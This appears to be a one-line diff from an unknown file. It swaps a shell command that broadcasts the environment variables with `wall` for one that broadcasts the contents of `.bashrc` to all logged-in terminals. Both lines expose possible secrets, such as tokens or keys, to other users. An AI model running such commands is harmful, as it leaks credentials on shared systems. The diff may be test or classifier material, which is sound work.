@@ -1,1 +1,1 @@
-wall -n $(env)
+wall -n $(cat .bashrc)
